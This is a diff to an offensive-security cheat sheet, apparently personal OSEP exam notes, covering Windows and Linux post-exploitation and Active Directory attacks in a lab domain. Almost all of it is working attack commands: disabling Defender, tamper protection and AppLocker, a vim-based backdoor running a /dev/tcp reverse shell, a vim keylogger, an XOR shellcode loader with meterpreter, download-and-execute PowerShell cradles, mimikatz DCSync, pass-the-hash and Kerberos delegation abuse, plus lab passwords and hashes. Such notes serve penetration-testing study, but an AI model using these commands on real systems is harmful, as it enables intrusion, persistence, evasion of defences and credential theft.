@@ -14,7 +14,8 @@
 - alternatively build msbuild xml files you want to run on the system
 - perform post exploit enumeration (WinPeas.ps1/Invoke-Seatbelt)
 - perform active directory enumeration (powerview.ps1/SharpHound.ps1)
-- privesc
+	- note down high value targets (domain admin)
+- privesc (then privesc again to SYSTEM if you are local admin that wants AD access)
 - disable defences
 - after getting system shell migrate to spoolsv
 - use incognito to switch to a user targeted by AD enumeration
@@ -369,9 +370,29 @@ Impersonated user is: NT AUTHORITY\SYSTEM.
 Executed '"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All' with impersonated token!
 ```
 
-## disable av
+## disable AV
+see also: https://github.com/swagkarna/Defeat-Defender-V1.2.0
+see also: https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1
+see also: https://theitbros.com/managing-windows-defender-using-powershell/
 ```powershell
+# you may need to disable tamper protection first
 Set-MpPreference -DisableRealtimeMonitoring $true
+
+# confirm that it works: output should be True
+Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
+
+# disable_defender derived from luna grabber
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend; Set-MpPreference -SubmitSamplesConsent 2; Add-MpPreference -ExclusionPath %SystemRoot%\Tasks; Set-MpPreference -ExclusionExtension '.exe'
+```
+
+```
+# if you need to disable tamper protection in order to disable AV you need to be SYSTEM or NT Service\TrustedInstaller
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtectionSource -Value 2
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name SenseDevMode -Value 0
+
+# confirm tamper protection state
+Get-MpComputerStatus | select IsTamperProtected
 ```
 
 # applocker bypass
@@ -486,6 +507,34 @@ regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 use auxiliary/server/regsvr32_command_delivery_server
 ```
 
+## disable applocker
+- via GUI
+```
+gpedit.msc > Computer Configuration > Windows Settings > Security Settings > Application Control Policies > AppLocker
+```
+- via CMD: create a file disable_applocker.inf
+```
+[Version]
+Signature="$WINDOWS NT$"
+
+[Unicode]
+Unicode=yes
+
+[RegistryValues]
+; Delete AppLocker GPO settings
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2 /f
+```
+
+```
+secedit /configure /db %windir%\security\local.sdb /cfg path\to\disable_applocker.inf /areas SECURITYPOLICY
+```
+- via PowerShell
+```
+# open powershell as administrator
+Get-AppLockerPolicy -Effective | Set-AppLockerPolicy -RuleType None
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
+```
+
 # bypass network filters
 
 ## generate self-signed certs
@@ -562,18 +611,14 @@ xfreerdp /u:Offsec /v:127.0.0.1 /p:lab
 # linux post exploitation
 
 ## vim (privileged) backdoor
-
 edit `.bashrc` and append:
-
 ```
 alias sudo="sudo -E"
 ```
-
 update bash environment
 ```
 source ~/.bashrc
 ```
-
 create a vim run script
 ```
 vim ~/.vimrunscript
@@ -581,20 +626,14 @@ vim ~/.vimrunscript
 # payload, reverse shell example
 bash -i >& /dev/tcp/192.168.49.102/443 0>&1
 ```
-
 edit/create '.vimrc' and append
 ```
 :silent !source ~/.vimrunscript
 ```
-
 every time the victim user runs vim it will execute our backdoor payload
-
 ## vim privesc
-
 if user can run sudo vim, once you are inside vim run `:shell`
-
 ## vim keylogger
-
 append to `/home/offsec/.vim/plugin/settings.vim`
 ```
 mkdir -p ~/.vim/plugin/
@@ -604,21 +643,18 @@ vim ~/.vim/plugin/settings.vim
 :autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
 :endif
 ```
-
 ## linux shellcode loader with AV bypass
-
-use `simpleLoader.c` in `OSEP-Code-Snippets/linux_shellcode_loaders` with `simpleXORencoder.c`
-
+`OSEP-Code-Snippets/linux_shellcode_loaders/simpleLoader.c` with `simpleXORencoder.c`
 ```
-if you want to use a meterpreter payload
-sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.206; set lport 443; exploit"
+sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.246; set lport 443; exploit"
+
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.167 LPORT=443 -f c
 - replace shell code in simpleXORencoder.c
-- gcc simpleXORencoder.c -o simpleXORencoder && ./simpleXORencoder
-- replace shell code in simpleLoader.c with output of simpleXORencoder
-- (on victim) gcc -o simpleLoader simpleLoader.c -z execstack
-```
+gcc simpleXORencoder.c -o simpleXORencoder && ./simpleXORencoder
 
+- replace shell code in simpleLoader.c with output of simpleXORencoder; (on victim):
+gcc -o simpleLoader simpleLoader.c -z execstack
+```
 ## LD_LIBRARY_PATH
 
 ```
@@ -756,7 +792,7 @@ runas /user:corp1.com\jeff powershell
 
 # import and get local admin creds this time
 Import-Module .\LAPSToolkit.ps1
-LAPSComputers
+Get-LAPSComputers
 ```
 
 ## access tokens (printspoofer)
@@ -823,16 +859,28 @@ meterpreter > impersonate_token corp1\\admin
 
 # return back to system
 rev2self
-
-# troubleshoot
+```
+### troubleshooting
+```
 - if you can't run getuid ()"stdapi_sys_config_getuid: Operation failed: Access is denied.") or shell:
+meterpreter > rev2self
 meterpreter > ps
 ...
 3388   752   notepad.exe              x64   0        domain\user_you_want_to_impersonate  C:\Windows\System32\notepad.exe
 ...
 meterpreter > migrate 3388
-```
 
+# if you run shell but only a process created e.g.
+meterpreter > impersonate_token 'SomeDomain\SomeUser'
+[+] Delegation token available
+[+] Successfully impersonated user  XXXXX
+meterpreter > shell
+Process 2016 created.
+Channel 4 created.
+meterpreter >
+
+"its a bug, you can get around in multiple ways, including spawning a process (execute -H -m -f cmd.exe) and then migrating to it, or just migrating to your selected user's process and then dropping to shell after a rev2self, or any one of a ton of ways like that"
+```
 # mimikatz
 ```
 Use Invoke-Mimikatz to run
@@ -889,6 +937,29 @@ Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\windows\tasks\lsass.dmp`" seku
 ```
 
 # windows lateral movement
+
+## RDP troubleshooting
+sometimes xfreerdp will not let you rdp even though you have the correct password, this is because it doesn't read in special characters properly
+```
+...nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE...
+
+# workaround 1: /sec:tls
+xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 /sec:tls
+
+# workaround 2: -sec-nla
+xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 -sec-nla
+
+# both workarounds require to retype the password in the GUI
+# alternative 1: install reminna
+# alternative 2: try rdesktop
+```
+
+```
+# sometimes xfreerdp may fail because there are too many users connected via RDP
+# in your reverse shell
+qwinsta /server:<YourServerName>
+rwinsta /server:<YourServerName> <SessionId>
+```
 
 ## RDP with DisableRestrictedAdmin
 ```
@@ -1316,7 +1387,19 @@ sudo responder -I tun0
 
 C:\Users\admin.CORP1>MSSQL.exe
 ```
+sometimes you will need to enumerate the server to obtain credentials
+```
+# example: challenge 2
+type C:\inetpub\wwwroot\search.asp
+...
+ConnString="DRIVER={SQL Server};SERVER=localhost;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music"
+...
 
+# replace the standard connection string
+conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
+# with this one
+conStr = "SERVER=localhost;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music";
+```
 ## stealing/relaying creds
 ```
 # relay ntlmv2 hash with impacket
@@ -1354,6 +1437,20 @@ res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; E
 # method 2:  sp_OACreate
 res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
 ```
+
+```
+# executing shellcode runner
+# generate b64 powershell payload
+pwsh
+PS> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("(New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/run.txt') | IEX"))
+KABOA...FAFgA
+# putting it into OSEP-Code-Snippets/MSSQL
+...
+String cmd = "powershell -enc KABOA...FAFgA";
+...
+```
+
+## custom assemblies (user defined functions udf)
 `OSEP-Code-Snippets/mssql_custom_assemblies`
 ```
 # by default 'msdb' database has TRUSTWORTHY but custom databases may use it as well
@@ -1489,46 +1586,63 @@ setspn -a prod.corp1.com/TestService3.prod.corp1.com:1337 prod.corp1.com\TestSer
 # then perform kerberoast with Invoke-Kerberoast.ps1
 ```
 
-## kerberos delegation
+## kerberos unconstrained delegation
+### enumeration
+we want to look for `TRUSTED_FOR_DELEGATION` any machine with this will be the target
 ```
-# enumerate unconstrained delegation
-# we want to look for TRUSTED_FOR_DELEGATION
 Get-DomainComputer -Unconstrained
 Get-DomainComputer -Unconstrained | Format-Table name, dnshostname, useraccountcontrol -Wrap
 # you can use the dnshostname property to determine its IP
 nslookup <dnshostname>
-```
 
+# enumeration troubleshooting
+Exception calling "FindAll" with "0" argument(s): "Unknown error (0x80005000)"
+- powerview won't work with local admin, local admin is not domain joined
+- SYSTEM is domained joined (as a computer object), upgrade to SYSTEM user via printspoofer
 ```
-# manual approach: you need a victim to to use a service that has unconstrained delegation
-# in this example: admin user is visiting http://appsrv01 from a client machine which stores the TGT in memory
+### manual approach
+attacker must wait for a victim to access a machine that has unconstrained delegation
+this example: admin user is visiting `http://appsrv01` from a client machine which stores the TGT in memory
+```
 # on the appsrv01 machine as user offsec open powershell with admin priv and -ep bypass
-# try with different versions if you still get errors
-. .\Invoke-Mimikatz.ps1
+# try different versions of Invoke-Mimikatz.ps1 if you still get errors
+. .\Invoke-Mimikatz2.ps1
 Invoke-Mimikatz -Command "privilege::debug sekurlsa::tickets"
 # look for ideal Client Name to target that is also forwardable in the flags
 ...
 Client Name  (01) : admin ; @ PROD.CORP1.COM
 ...
-# note: sometimes you won't get the ticket, you need to be quick or use the right browser
+# note: sometimes you won't get the ticket
+- you need to be quick or use the right browser to visit http://appsrv01 to cache TGT in memory
 Invoke-Mimikatz -Command 'privilege::debug "sekurlsa::tickets /export"'
 # ls to see all the tickets and find the one that matches your target
 Invoke-Mimikatz  -Command '"kerberos::ptt [0;10a3f5]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi"'
 C:\Tools\SysinternalsSuite\PsExec.exe /accepteula \\cdc01 cmd
 ```
-
+### semi-auto approach
+force dc to connect to application service using SpoolSample.exe
 ```
-# semi-auto approach: force dc to connect to application service using SpoolSample.exe
 # check if print spooler service is running and accessible
 dir \\cdc01\pipe\spoolss
-# with admin priv
-.\Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
+
+# with admin priv load rubeus into memory
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
+$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
+[Rubeus.Program]::Main("monitor /interval:5 /filteruser:DC03$ /nowrap".Split())
+
 # in a seperate terminal
-.\SpoolSample.exe CDC01 APPSRV01
+.\SpoolSample.exe  APPSRV01
+Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>'
+Invoke-SpoolSample -Target 'CDC01.prod.corp1.com' -CaptureServer 'APPSRV01.prod.corp1.com'
+
 # copy and paste the captured base64 encoded ticket
-.\Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
+$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
+[Rubeus.Program]::Main("ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...".Split())
+
 # once authenticated as CDC01$ perform dcsync and dump password hash of prod\krbtgt
-lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.246/Invoke-Mimikatz2.ps1")
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt"'
 Domain : prod.corp1.com / S-1-5-21-749318035-33825885-105668094
 ...
 Credentials:
@@ -1558,13 +1672,12 @@ impacket-psexec  -k -no-pass PROD/newAdmin@cdc01.prod.corp1.com -dc-ip 192.168.1
 # alternatively, with golden ticket we can dump the password hash of a member of the Domain Admins group (DCSync attack)
 # which we will attempt below
 ```
-
-```
-# clean approach: perform semi-auto approach in the comfort of kali
-
-# prerequisites:
+### clean approach
+perform semi-auto approach in the comfort of kali
+prerequisites:
 - admin credentials
 - edit /etc/hosts
+```
 sudo vim /etc/hosts
 ...
 # <dc_ip> <domain> <dc_fqdn>
@@ -1640,17 +1753,21 @@ impacket-secretsdump -k CDC01.prod.corp1.com -just-dc
 ```
 
 ```
-# after performing DCSync attack with the krbtgt ticket we can use the hash of Local Administrator on the DC to psexec
+# after performing DCSync attack with the krbtgt ticket we can use the hash of Administrator on the DC to psexec
+impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e administrator@rdc01.corp1.com
+
+alternatively: metasploit
 sudo msfconsole
 use exploit/windows/smb/psexec
 set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.45.206
+set LHOST 192.168.45.246
+set RHOST 192.168.176.120
 set LPORT 443
 set SMBUser Administrator
 set SMBPass aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e
 exploit
 ```
-
+## kerberos constrained delegation
 ```
 # enumerate constrained delegation
 # reference: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation
@@ -1693,16 +1810,15 @@ Invoke-Rubeus -Command "s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /
 
 ```
 # example 2: constained delegation with rubeus.txt
-$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.195/rubeus.txt')
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("purge".Split())
 # use mimikatz to dump lsass then continue below
 [Rubeus.Program]::Main("s4u /user:web01$ /rc4:b8cdd27f8218f12b4a49b7e06db340b6 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
 klist
 ```
-
+## kerberos resource-based contrained delegation
 ```
-# Resource-Based Contrained Delegation
 # requires: computer/service account with an SPN in msDS-AllowedToActOnBehalfOfOtherIdentity of backend service account
 # requires: GenericWrite access on a user to add SID of computer account to msDS-AllowedToActOnBehalfOfOtherIdentity of backend service
 # scenario: as user 'dave' on hostname 'client' we want to abuse constrained delegation to access mssql service
@@ -1757,6 +1873,15 @@ Invoke-Rubeus -Command "s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438
 # verify and continue attack chain
 klist
 dir \\appsrv01.prod.corp1.com\c$
+```
+
+## kirbi ccache converter
+```
+# kirbi to ccache
+msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.kirbi outputpath=ticket.ccache
+
+# ccache to kirbi
+msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.ccache outputpath=ticket.kirbi
 ```
 
 ## forest
@@ -2004,7 +2129,7 @@ sudo smbpasswd -a kali
 sudo systemctl start smbd nmbd
 
 # ensure '/home/kali/osep/OSEP-Code-Snippets/' exists
-chmod -R 777 /home/kali/data
+chmod -R 777 /home/kali/osep
 ```
 
 ```
